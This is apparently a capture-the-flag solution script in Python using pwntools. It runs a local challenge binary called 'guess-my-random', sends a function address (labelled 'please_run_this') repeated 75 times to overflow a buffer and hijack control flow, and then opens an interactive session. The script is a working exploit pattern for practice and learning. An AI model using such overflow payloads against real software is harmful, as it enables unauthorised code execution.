#!/usr/bin/env python

from pwn import *

p = process('./guess-my-random')

"""
0x0804863b  please_run_this
"""

p.sendline(p32(0x0804863b)*75)

p.interactive()
